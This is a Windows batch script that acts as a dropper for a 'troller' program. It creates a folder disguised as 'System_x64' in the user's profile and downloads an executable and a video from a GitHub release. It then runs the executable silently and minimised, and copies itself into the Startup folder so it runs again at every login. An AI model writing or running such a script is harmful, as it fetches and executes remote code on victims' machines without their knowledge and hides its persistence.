@echo off
set DOWNLOAD_FOLDER=%userprofile%\System_x64

:: create download folder if it doesn't exist
if not exist "%DOWNLOAD_FOLDER%" (
    mkdir "%DOWNLOAD_FOLDER%"
)

:: download the executable and the video file
curl -L "https://github.com/vexnity/troller-revamped/releases/download/new/main.exe" -o "%DOWNLOAD_FOLDER%\troller.exe"
curl -L "https://github.com/vexnity/troller-revamped/releases/download/Release/troll_in_suit.mp4" -o "%DOWNLOAD_FOLDER%\troll in suit.mp4"

:: check if the files are downloaded
if exist "%DOWNLOAD_FOLDER%\troller.exe" (
    echo troller.exe downloaded successfully.
) else (
    echo Failed to download troller.exe.
    exit /b 1
)

if exist "%DOWNLOAD_FOLDER%\troll in suit.mp4" (
    echo troll in suit.mp4 downloaded successfully.
) else (
    echo Failed to download troll in suit.mp4.
    exit /b 1
)

:: run the executable silently
start /b /min "%DOWNLOAD_FOLDER%\troller.exe"

:: check if the process started
echo Waiting for troller.exe to start...
timeout /t 5 /nobreak

tasklist /fi "imagename eq troller.exe"

:: ensure the executable runs at startup
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

echo Files have been moved to System_x64 folder, troller.exe started, and script set to run at startup.
pause
